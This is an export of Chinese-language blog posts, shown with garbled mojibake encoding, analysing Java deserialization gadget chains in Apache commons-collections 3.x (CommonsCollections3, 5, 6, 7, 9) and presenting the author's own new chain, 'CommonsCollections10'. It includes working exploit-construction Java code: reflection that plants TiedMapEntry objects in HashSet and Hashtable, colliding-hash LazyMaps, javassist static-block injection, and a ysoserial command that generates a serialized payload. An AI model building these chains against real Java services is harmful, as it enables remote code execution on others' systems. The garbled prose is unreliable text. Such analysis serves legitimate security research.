æˆ‘ä»¬åœ¨2ä¸­æåˆ°äº†é™¤äº†CommonsCollections5ç”¨çš„toStringå¤–ï¼Œè¿˜æœ‰hashCodeå’Œequalså‡½æ•°ä¹Ÿè°ƒç”¨äº†getValueå‡½æ•°ã€‚é‚£ä¹ˆæ˜¯å¦å­˜åœ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„å¯¹è±¡å‡½æ•°å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼ CommonsCollections6åˆ©ç”¨äº†TiedMapEntryçš„hashCodeå‡½æ•°ï¼Œæ¥è§¦å‘LazyMap.get æˆ‘ä»¬éƒ½çŸ¥é“HashSeté›†åˆé‡Œä¸ä¼šå­˜åœ¨ç›¸åŒçš„keyï¼Œé‚£ä¹ˆæ˜¯å¦‚ä½•åˆ¤æ–­æ˜¯å¦æ˜¯ç›¸åŒçš„keyå‘¢ï¼Ÿè¿™é‡Œå°±è¦ç”¨åˆ°keyçš„hashCodeå‡½æ•°äº†ï¼Œå¦‚æœkeyçš„å€¼ç›¸åŒï¼Œå…¶hashCodeè¿”å›çš„å€¼ä¹Ÿæ˜¯ç›¸åŒçš„ã€‚è¿™é‡Œçš„HashCodeçš„è®¡ç®—åœ¨HashSetçš„putå’Œaddå‡½æ•°å®Œæˆï¼Œå¹¶ä¸”HashSetä»åºåˆ—åŒ–æ•°æ®ä¸­è¿˜åŸå‡ºæ¥æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨putå‡½æ•°ï¼Œè¿™é‡Œå°±ç»™æˆ‘ä»¬æä¾›äº†å¯æ§çš„åœ°æ–¹ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹HashSetçš„readObjectå‡½æ•° ç»§ç»­è·Ÿputå‡½æ•°ï¼Œè¿™é‡Œå…¶å®è°ƒç”¨çš„æ˜¯HashMapçš„putå‡½æ•° å…¶ä¸­å¯¹keyè°ƒç”¨çš„hash()å‡½æ•°ä¼šè°ƒç”¨key.hashCodeå‡½æ•°ï¼Œé‚£ä¹ˆç°åœ¨å°±å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä»¬åªè¦å°†keyçš„å€¼æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå¯¹è±¡å°±å¯ä»¥äº†ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„keyå€¼å…¶å®å°±æ˜¯HashSet.addçš„å®ä¾‹ï¼Œåœ¨HashSeté‡Œçš„HashMapç±»å±æ€§åªç”¨åˆ°äº†Keyã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 123456HashSet.readObject() -&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() 4. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections7CommonsCollections7ç”¨äº†Hashtableæ¥ä»£æ›¿AnnotationInvocationHandlerï¼Œä¸åŒäºå‰é¢ä¸¤ç§CommonsCollections7å¹¶æœªä½¿ç”¨TiedMapEntryï¼Œè€Œæ˜¯ç”¨äº†ç›¸åŒkeyå†²çªçš„æ–¹å¼è°ƒç”¨equalsæ¥è§¦å‘Lazy.getå‡½æ•°ã€‚ å…ˆæ¥çœ‹ä¸€ä¸‹Hashtableçš„readObjectå‡½æ•° ç»§ç»­è·Ÿè¿›reconstitutionPut è¯¥å‡½æ•°å°†å¡«å……tableçš„å†…å®¹ï¼Œå…¶ä¸­ç¬¬1236è¡Œä»…å½“æœ‰é‡å¤æ•°æ®å†²çªæ—¶ï¼Œæ‰ä¼šè¿›å…¥ä¸‹é¢çš„ifè¯­å¥ï¼Œè¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›equalså‡½æ•° è¿™é‡Œçš„equalså‡½æ•°å–å†³äºkeyçš„å¯¹è±¡ï¼Œåˆ©ç”¨é“¾ç”¨çš„æ˜¯LazyMapå¯¹è±¡ï¼Œå®é™…è°ƒç”¨çš„æ˜¯çˆ¶ç±»AbstractMapDecoratorçš„equalså‡½æ•° è¿™é‡Œåˆè°ƒç”¨äº†mapçš„equalså‡½æ•°ï¼Œè¿™é‡Œå®é™…è°ƒç”¨çš„æ˜¯HashMapçš„çˆ¶ç±»AbstractMapçš„equalså‡½æ•° åœ¨ç¬¬495è¡Œè°ƒç”¨äº†m.getå‡½æ•°ï¼Œæ‰€ä»¥åé¢åˆæ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„LazyMap.getçš„å¥—è·¯äº†ã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 123456Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals -&gt; m.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() 5. åˆ©ç”¨é“¾æ„é€ CommonsCollections6å’Œ7çš„expæ„é€ æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œå•ç‹¬æ‹¿å‡ºæ¥è®²ä¸€ä¸‹ã€‚ CommonsCollections6ç»è¿‡å‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“CommonsCollections6éœ€è¦å°†æ„é€ å¥½çš„TiedMapEntryå®ä¾‹æ·»åŠ åˆ°HashSetçš„å€¼ä¸Šã€‚ ç®€å•çš„æ–¹æ³•å°±æ˜¯ç›´æ¥add 123TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");HashSet map = new HashSet(1);map.add(entry); å¤æ‚ä¸€ç‚¹ï¼Œå°±æ˜¯ysoserailé‡Œçš„å®ç°æ–¹æ³•ï¼Œé‡‡ç”¨åå°„æœºåˆ¶æ¥å®Œæˆ å…¶æ€è·¯ä¸»è¦ä¸ºï¼š å®ä¾‹åŒ–ä¸€ä¸ªHashSetå®ä¾‹ é€šè¿‡åå°„æœºåˆ¶è·å–HashSetçš„mapç±»å±æ€§ é€šè¿‡åå°„æœºåˆ¶è·å–HashMap(mapç±»å±æ€§)çš„table(Node&lt;K,V&gt;)ç±»å±æ€§ é€šè¿‡åå°„æœºåˆ¶è·å–Nodeçš„keyç±»å±æ€§ï¼Œå¹¶è®¾ç½®è¯¥keyçš„å€¼ä¸ºæ„é€ å¥½çš„TiedMapEntryå®ä¾‹ å…·ä½“ä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334HashSet map = new HashSet(1);map.add(\"foo\");Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");//è·å–HashSetçš„map Fieldå¯¹è±¡&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Permit.setAccessible(f);// è®¾ç½®mapå¯è¢«è®¿é—®ä¿®æ”¹HashMap innimpl = null;innimpl = (HashMap) f.get(map);// è·å–mapå®ä¾‹çš„mapç±»å±æ€§Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");// è·å–HashMapçš„ table field&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Permit.setAccessible(f2);// è®¾ç½®HashMapçš„field å¯è¢«è®¿é—®Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];// è·å–Node&lt;k,v&gt;å®ä¾‹if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");// è·å–Nodeçš„key field&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Permit.setAccessible(keyField);// è®¾ç½®è¯¥Fieldå¯è¢«è®¿é—®ä¿®æ”¹keyField.set(node, entry);// å¯¹nodeå®ä¾‹å¡«å……keyçš„å€¼ä¸ºTiedMapEntryå®ä¾‹ ç»è¿‡ä¸Šé¢çš„æ“ä½œï¼Œæœ€ç»ˆçš„HashSetå®ä¾‹è¢«æˆ‘ä»¬åµŒå…¥äº†æ„é€ å¥½çš„TiedMapEntryå®ä¾‹ã€‚ è¿™é‡Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ç”¨ysoserailçš„Reflectionsæ¥ç®€åŒ–expï¼Œå‡ºæ¥çš„ç»“æœæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œè¿˜æ²¡æœ‰æ‰¾åˆ°å…·ä½“çš„åŸå› ã€‚å¦‚æœæœ‰å¸ˆå‚…é‡åˆ°è¿‡è¿™ç§é—®é¢˜ï¼Œæ¬¢è¿ä¸€èµ·è®¨è®ºè®¨è®ºï¼ CommonsCollections7CommonsCollectionsåˆ©ç”¨çš„æ˜¯keyçš„hashå†²çªçš„æ–¹æ³•æ¥è§¦å‘equalså‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨LazyMap.getå‡½æ•° é‚£ä¹ˆæ„é€ expçš„å…³é”®å°±æ˜¯æ„é€ ä¸€ä¸ªhashå†²çªçš„LazyMapäº†ã€‚ è¿™é‡Œå¤§å®¶å¯ä»¥è·Ÿä¸€ä¸‹String.hashCodeå‡½æ•°ï¼Œä»–çš„è®¡ç®—æ–¹æ³•å­˜åœ¨ä¸åŒå­—ç¬¦ä¸²ç›¸åŒhashçš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚å¦‚ä¸‹ä»£ç  CommonsCollections7ç”¨çš„å°±æ˜¯è¿™ä¸ªbugæ¥åˆ¶é€ hashå†²çªã€‚ è¿™é‡Œéœ€è¦æä¸€ç‚¹çš„æ˜¯è§¦å‘LazyMap.getå‡½æ•° è¦èµ°åˆ°ç¬¬151è¡Œçº¢æ¡†æ¡†ä¸Šï¼Œé¦–å…ˆéœ€è¦æ»¡è¶³çš„æ˜¯mapé‡Œä¸å­˜åœ¨å½“å‰è¿™ä¸ªkey ä½†æ˜¯æ˜æ˜¾åœ¨ç¬¬ä¸€æ¬¡ä¸å­˜åœ¨è¿™ä¸ªkeyåï¼Œä¼šæ›´æ–°mapçš„é”®å€¼ï¼Œè¿™å°†å¯¼è‡´ä¸‹æ¬¡åŒæ ·çš„keyè¿›æ¥ï¼Œå°±ä¸ä¼šè§¦å‘åç»­çš„payloadäº†ã€‚æˆ‘ä»¬åœ¨å†™expçš„æ—¶å€™éœ€è¦æ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚ æ¥çœ‹ä¸€ä¸‹ysoserialçš„CommonsCollections7æ˜¯æ€ä¹ˆç¼–å†™çš„ï¼ 123456789101112131415161718Map innerMap1 = new HashMap();Map innerMap2 = new HashMap();// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObjectMap lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);lazyMap1.put(\"yy\", 1);Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);lazyMap2.put(\"zZ\", 1);// Use the colliding Maps as keys in HashtableHashtable hashtable = new Hashtable();hashtable.put(lazyMap1, 1);hashtable.put(lazyMap2, 2);Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);// Needed to ensure hash collision after previous manipulationslazyMap2.remove(\"yy\"); å…¶ä¸­ç¬¬ä¸¤æ¬¡çš„putä¼šä½¿å¾—ä¼šä½¿å¾—LazyMap2ä¸­å¢åŠ äº†yyè¿™ä¸ªé”®å€¼ï¼Œä¸ºäº†ä¿è¯ååºåˆ—åŒ–åä»ç„¶å¯ä»¥è§¦å‘åç»­çš„åˆ©ç”¨é“¾ï¼Œè¿™é‡Œéœ€è¦å°†lazyMap2çš„yyé”®å€¼removeæ‰ã€‚ 6. æ„é€ æ–°CommonsCollections10ç»è¿‡å¯¹å‰é¢1,3,5,6,7çš„åˆ†æï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥å‘ç°å¾ˆå¤špayloadéƒ½æ˜¯â€œæ‚äº¤â€çš„æˆæœã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦èƒ½æ ¹æ®å‰é¢çš„åˆ†æï¼Œæ„é€ å‡ºä¸€ä¸ªæ–°çš„CommonsCollectionsçš„payloadå‘¢ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼Œæ¥ä¸‹æ¥è®²ä¸€ä¸‹æˆ‘æ‰¾åˆ°çš„ä¸€ä¸ªæ–°payloadåˆ©ç”¨ã€‚ è¿™ä¸ªpayloadä¸ºCommonsCollections6å’Œ7çš„ç»“åˆï¼ŒåŒCommonsCollections6ç±»ä¼¼ï¼Œè¿™é‡Œä¹Ÿç”¨åˆ°äº†TiedMapEntryçš„hashCodeå‡½æ•° æˆ‘ä»¬åœ¨åˆ†æHashtableçš„reconstitutionPutå‡½æ•°æ—¶ï¼Œçœ‹ä¸‹å›¾ è¯¥å‡½æ•°åœ¨ç¬¬1234è¡Œå¯¹keyè°ƒç”¨äº†ä¸€æ¬¡hashCodeå‡½æ•°ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œå¦‚æœkeyå€¼è¢«ä»£æ›¿ä¸ºæ„é€ å¥½çš„TiedMapEntryå®ä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬å°±èƒ½è§¦å‘LazyMap.getå‡½æ•°ï¼Œåç»­çš„è°ƒç”¨é“¾å°±ç±»ä¼¼äº†ã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 1234567Hashtable.readObject() -&gt; Hashtable.reconstitutionPut -&gt; key.hashCode() =&gt; TiedMapEntry.hashCode() -&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() å…¶å®ä»åˆ©ç”¨é“¾æ¥çœ‹ï¼Œä¸CommonsCollections6çš„åŒºåˆ«åœ¨äºå‰éƒ¨çš„è§¦å‘ä½¿ç”¨äº†ä¸åŒçš„å¯¹è±¡ã€‚ æ¥ä¸‹æ¥ï¼Œç»“åˆç¬¬5ç‚¹çš„å­¦ä¹ ï¼Œæˆ‘ä»¬æ¥å†™ä¸€ä¸‹è¿™ä¸ªpayloadçš„åˆ©ç”¨é“¾exp 12345678910111213141516171819202122232425final Transformer transformerChain = new ChainedTransformer(new Transformer[]&#123;&#125;);final Map innerMap = new HashMap();final Map innerMap2 = new HashMap();final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\");Hashtable hashtable = new Hashtable();hashtable.put(\"foo\",1);// è·å–hashtableçš„tableç±»å±æ€§Field tableField = Hashtable.class.getDeclaredField(\"table\");Permit.setAccessible(tableField);Object[] table = (Object[])tableField.get(hashtable);Object entry1 = table[0];if(entry1==null) entry1 = table[1];// è·å–Hashtable.Entryçš„keyå±æ€§Field keyField = entry1.getClass().getDeclaredField(\"key\");Permit.setAccessible(keyField);// å°†keyå±æ€§ç»™æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå®ä¾‹keyField.set(entry1, entry);// å¡«å……çœŸæ­£çš„å‘½ä»¤æ‰§è¡Œä»£ç Reflections.setFieldValue(transformerChain, \"iTransformers\", transformers);return hashtable; 7. æ¢…å­é…’å¸ˆå‚…çš„CommonsCollections9æ‰¾åˆ°ä¸Šé¢CommonsCollections10æ—¶ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹æœ‰æ²¡æœ‰å¸ˆå‚…å·²ç»æŒ–åˆ°è¿‡äº†ï¼Œä¸€å…±æ‰¾åˆ°ä¸‹é¢ä¸‰ä½å¸ˆå‚… https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d https://github.com/frohoff/ysoserial/pull/116 ä¸€ä¸ªä¸€ä¸ªæ¥è¯´ ç¬¬ä¸€ä¸ªJayl1nå¸ˆå‚…åšçš„æ”¹å˜ä¸»è¦æ˜¯æœ€ç»ˆçš„Runtime.getRuntime().execæ”¹æˆäº†URLClassLoader.loadClass().newInstanceçš„æ–¹å¼ï¼Œå‰é¢ç”¨çš„è¿˜æ˜¯CommonsCollections6ï¼Œè¿™é‡Œæš‚æ—¶ä¸å°†å…¶å½’ç±»ä¸ºæ–°çš„åˆ©ç”¨é“¾ã€‚ ç¬¬äºŒä¸ªæ˜¯æ¢…å­é…’å¸ˆå‚…æäº¤çš„CommonsCollections9ï¼Œä¸»è¦åˆ©ç”¨çš„æ˜¯CommonsCollections:3.2ç‰ˆæœ¬æ–°å¢çš„DefaultedMapæ¥ä»£æ›¿LazyMapï¼Œå› ä¸ºè¿™ä¸¤ä¸ªMapæœ‰åŒæ ·çš„getå‡½æ•°å¯ä»¥è¢«åˆ©ç”¨ï¼Œè¿™é‡Œä¸å†å…·ä½“åˆ†æã€‚ ç¬¬ä¸‰ä¸ªæ˜¯navalorenzoå¸ˆå‚…æäº¤çš„CommonsCollections8ï¼Œå…¶åˆ©ç”¨é“¾åŸºäºCommonsCollections:4.0ç‰ˆæœ¬ï¼Œæš‚æ—¶ä¸åœ¨æœ¬ç¯‡æ–‡ç« çš„åˆ†æèŒƒå›´å†…ï¼Œåé¢ä¼šå¥½å¥½åˆ†æä¸€ä¸‹ã€‚ 0x03 æ€»ç»“è”åˆå‰é¢ä¸¤ç¯‡æ–‡ç« CommonsCollections1ã€CommonsCollections3ï¼Œåœ¨åŠ ä¸Šæœ¬æ–‡çš„CommonsCollections5ï¼Œ6ï¼Œ7ï¼Œ9ï¼Œ10ã€‚ ç”±äºç½‘ä¸Šå·²ç»æœ‰ç±»ä¼¼çš„æ–‡ç« åšäº†æ€»ç»“ï¼Œè¿™é‡Œå°±ç®€å•åšä¸€ä¸‹CommonsCollections&lt;=3.2.1ä¸‹çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„æ€»ç»“ã€‚ èµ·å§‹ç‚¹ AnnotationInvocationHandlerçš„readObject BadAttributeValueExpExceptionçš„readObject HashSetçš„readObject Hashtableçš„readObject é‡è¦çš„æ‰¿æ¥ç‚¹ LazyMapçš„get DefaultedMapçš„get TiedMapEntryçš„getValue Proxyçš„invoke ç»ˆç‚¹ ChainedTransformerçš„transform InvokerTransformerçš„transform ConstantTransformerçš„transform å„expçš„jdké€‚ç”¨ç‰ˆæœ¬ jdk7 =&gt; CommonsCollection1ã€3 jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10 å„expçš„commons-collectionsé€‚ç”¨ç‰ˆæœ¬ commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10 commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10 æœ€åçš„æœ€åï¼Œcommons-collections:3.xç‰ˆæœ¬çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾å°±åˆ†æåˆ°è¿™é‡Œï¼Œå…¶å®æˆ‘ç›¸ä¿¡å¦‚æœæƒ³ç»§ç»­æŒ–å¯ä»£æ›¿çš„åˆ©ç”¨é“¾è¿˜æ˜¯ä¼šæœ‰çš„ï¼Œå°±åƒæœ¬æ–‡æŒ–åˆ°çš„CommonsCollections10ï¼Œå¦‚æœå„ä½å¸ˆå‚…æœ‰å…´è¶£å¯ä»¥ç»§ç»­æŒ–ä¸‹å»ï¼Œä¹Ÿæ¬¢è¿å’Œå„ä½å¸ˆå‚…ä¸€èµ·äº¤æµã€‚ åç»­è¿˜ä¼šæŠŠcommons-collections:4ç‰ˆæœ¬çš„åˆ©ç”¨é“¾åšä¸€ä¸ªåˆ†æï¼Œæ¬¢è¿ä¸€èµ·äº¤æµï¼šï¼‰"},{"title":"Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections3","permalink":"http://blog.0kami.cn/2019/10/28/java/study-java-deserialized-commonscollections3-3/","text":"0x00 å‰è¨€å‰é¢åˆ†æäº†ysoserialçš„CommonsCollections1ï¼Œç†Ÿæ‚‰äº†ä¸€ç‚¹Javaååºåˆ—åŒ–ã€‚æœ¬æ–‡å°†ç»§ç»­åˆ†æysoserialçš„åˆ©ç”¨ï¼Œä»Šå¤©çš„ä¸»è§’æ˜¯CommonsCollections3. 0x01 ç¯å¢ƒå‡†å¤‡é¦–å…ˆç”±äºoverrideçš„åŸå› ï¼Œç¯å¢ƒä½¿ç”¨çš„æ˜¯jdk7u80ã€‚åˆ©ç”¨ysoserialç”Ÿæˆpayloadï¼Œå¹¶è½½å…¥è°ƒè¯•ã€‚ 1java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 \"open /System/Applications/Calculator.app\" &gt; commonscollections3.ser 0x02 åŸºç¡€çŸ¥è¯†åœ¨åˆ†æå¼€å§‹å‰ï¼Œå…ˆè¡¥å……ä¸€ä¸‹åŸºç¡€çŸ¥è¯† 12public class StaticBlockTest &#123;&#125; 12345678910111213141516171819202122public class Cracker &#123; public static byte[] generate()&#123; try &#123; String code = \"&#123;java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");&#125;\"; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(StaticBlockTest.class.getName()); clazz.setName(\"demo\"); clazz.makeClassInitializer().insertAfter(code); return clazz.toBytecode(); // ... &#125; public static void main(String[] args) &#123; byte[] clazz = generate(); DefiningClassLoader loader = new DefiningClassLoader(); Class cls = loader.defineClass(\"demo\",clazz);// ä»å­—èŠ‚æ•°ç»„ä¸­æ¢å¤ç±» try &#123; cls.newInstance(); // å®ä¾‹åŒ–è¯¥ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨é™æ€å—å†…çš„ä»£ç  &#125; // ... &#125;&#125; é€šè¿‡ä¸Šé¢è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—çš„çŸ¥è¯†ç‚¹ä¸»è¦ä¸ºä¸¤ç‚¹ï¼š â€‹ a. defineClasså¯ä»¥ä»byteæ•°ç»„ä¸­æ¢å¤ä¸€ä¸ªClass â€‹ b. static initializeråœ¨ç±»è½½å…¥æ—¶å°†è‡ªåŠ¨æ‰§è¡Œï¼ˆé™æ€å—å†…çš„ä»£ç ï¼‰ Javaä¸­åŠ¨æ€è°ƒç”¨çš„å¦ä¸€ç§æ–¹å¼æ˜¯defineClass Javaæä¾›äº†ClassLoaderä»bytesæ•°ç»„ä¸­è¿˜åŸClassçš„æ–¹æ³•ï¼ŒdefineClasså‡½æ•°å°±æ˜¯å®Œæˆè¿™ä¸€è¿‡ç¨‹çš„å‡½æ•°ã€‚ ç†è®ºä¸Šï¼Œå¦‚æœä»£ç ä¸­ä½¿ç”¨äº†è¿™ç§æ–¹å¼ï¼Œä¸”byteæ•°æ®çš„å†…å®¹å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„Javaä»£ç ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ è¿™é‡Œå°±ç”¨åˆ°äº†Javaç±»çš„å¦ä¸€ä¸ªç‰¹æ€§ï¼Œstatic blockåœ¨ç±»è½½å…¥æ—¶è‡ªåŠ¨æ‰§è¡Œå—å†…çš„ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡javassistå¯¹é™æ€å—æ³¨å…¥ä»»æ„ä»£ç ï¼Œè¯¥ç±»è¢«æ¢å¤å¹¶è½½å…¥æ—¶ä¼šè°ƒç”¨æ³¨å…¥çš„ä»£ç ï¼Œåæ–‡çš„åˆ©ç”¨é“¾ä¸»è¦å°±æ˜¯ç”¨åˆ°äº†è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹ã€‚ 0x03 åˆ©ç”¨é“¾åˆ†æ1. å‰æ™¯å›é¡¾è¿™é‡Œé€‰æ‹©CommonsCollections3æ˜¯å› ä¸ºä»–çš„å‰åŠæ®µè§¦å‘çš„åˆ©ç”¨é“¾è·ŸCommonsCollections1æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦åˆ†æååŠæ®µå‘½ä»¤æ‰§è¡Œçš„æ„é€ å³å¯ã€‚å›é¡¾ä¸€ä¸‹å‰åŠæ®µåˆ©ç”¨é“¾ 123456sun.reflect.annotation.AnnotationInvocationHandler.readObject() -&gt; memberValues.entrySet() -&gt; AnnotationInvocationHandler.invoke() -&gt; memberValues.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; iTransformers[].transform() CommonsCollections1ä¸­ChainedTransformer.transform()ä¼šå¾ªç¯è°ƒç”¨iTransformersæ•°ç»„é‡Œçš„å¯¹è±¡çš„transformå‡½æ•°ã€‚CommonsCollections1ç”¨çš„æ˜¯InvokerTransformerçš„transformï¼Œå› ä¸ºè¯¥å‡½æ•°å®ç°äº†åå°„è°ƒç”¨ä»»æ„ç±»çš„åŠŸèƒ½ã€‚é‚£ä¹ˆé™¤äº†ä½¿ç”¨InvokerTransformerè¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„æ–¹æ³•ï¼Ÿç­”æ¡ˆå½“ç„¶æ˜¯è‚¯å®šçš„ï¼ 2. æ–°çš„å‘½ä»¤æ‰§è¡Œåˆ©ç”¨é“¾æ¥çœ‹ä¸€ä¸‹CommonsCollections3çš„payloadsæ„é€  123456789Object templatesImpl = Gadgets.createTemplatesImpl(command);// real chain for after setupfinal Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] &#123; Templates.class &#125;, new Object[] &#123; templatesImpl &#125; )&#125;;// åç»­ç±»ä¼¼ çœç•¥ ConstantTransformerä¸Šä¸€ç¯‡å·²ç»è¯´è¿‡äº†ï¼Œå…¶transformä¼šè¿”å›æ„é€ æ—¶çš„å¯¹è±¡ï¼Œè¿™é‡Œå°±æ˜¯TrAXFilter.classå¯¹è±¡ã€‚ æˆ‘ä»¬é‡ç‚¹æ¥çœ‹InstaniateTransformerçš„transformå‡½æ•° ç®€å•æ¥çœ‹ï¼Œè¯¥å‡½æ•°å¯¹è¾“å…¥çš„inputï¼ˆè¿™é‡Œå°±æ˜¯TrAXFilter.classï¼‰åšå®ä¾‹åŒ–çš„æ“ä½œã€‚è¿™é‡Œçœ‹èµ·æ¥ï¼Œå…¶å®æœ‰ç‚¹åƒphpä¸­æ‰¾å¯¹åº”çš„__constructsï¼Œåœ¨Javaé‡Œæˆ‘ä»¬å°±å»æ‰¾æ„é€ å‡½æ•°é‡Œåšäº†å±é™©æ“ä½œçš„classã€‚ æ¥çœ‹ä¸€ä¸‹TrAXFilterç±»çš„æ„é€ å‡½æ•° è¿™é‡Œçš„templateså°±æ˜¯ä¸Šé¢expä¸­æ„é€ çš„templatesImpl. ç»§ç»­çœ‹TransformerImplçš„newTransformerå‡½æ•° org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java:newTransformer:481 ç»§ç»­çœ‹getTransletInstance å†ç»§ç»­defineTransletClasses çœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œæ²¡é”™ï¼Œè¿™é‡Œç”¨åˆ°äº†0x02ä¸­çš„ä¸¤ä¸ªåŸºç¡€çŸ¥è¯†ã€‚defineTransletClassesè¿˜åŸå‡ºç±»ï¼ŒgetTransletInstanceè¿›è¡Œå®ä¾‹åŒ–ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªåˆé€‚çš„_bytecodeså³å¯æ‰§è¡Œä»»æ„Javaä»£ç ã€‚ ä¸‹é¢è¡¥å……ä¸€ä¸‹ï¼Œåœ¨æ„é€ expæ—¶éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼š æ¤å…¥çš„templatesä¸ºTransformerImplç±»ï¼Œä»è€Œè°ƒç”¨åç»­çš„newTransformerå‡½æ•° æ¤å…¥çš„templateså®ä¾‹ï¼Œ_nameä¸ä¸ºnull,_classä¸ºnull æ¤å…¥çš„templateså®ä¾‹ï¼Œ_bytecodesä¸ä¸ºnull,_tfactoryä¸ºTransformerFactoryImplå¯¹è±¡ æ¤å…¥çš„templates._bytecodesæ•°ç»„ï¼Œå…¶æœ€ç»ˆè¿˜åŸçš„å¯¹è±¡çˆ¶ç±»ä¸ºcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet é‚£ä¹ˆæ€ä¹ˆæ‰èƒ½æ»¡è¶³è¿™äº›æ¡ä»¶å‘¢ï¼Ÿè¿™é‡Œç¥å¥‡çš„javassiståˆè¦ä¸Šåœºå•¦ï¼ æ¥çœ‹ä¸€ä¸‹ysoserialçš„æ“ä½œ ä¸Šé¢çš„ä»£ç ä¸åšçœç•¥ï¼Œæˆ‘ä»¬åº”è¯¥å¥½å¥½å­¦ä¹ ä¸€ä¸‹javassistçš„åŸºæœ¬æ“ä½œï¼Œä»£ç å¯ä»¥åœ¨Gadgets.createTemplatesImplæ‰¾åˆ°ï¼ 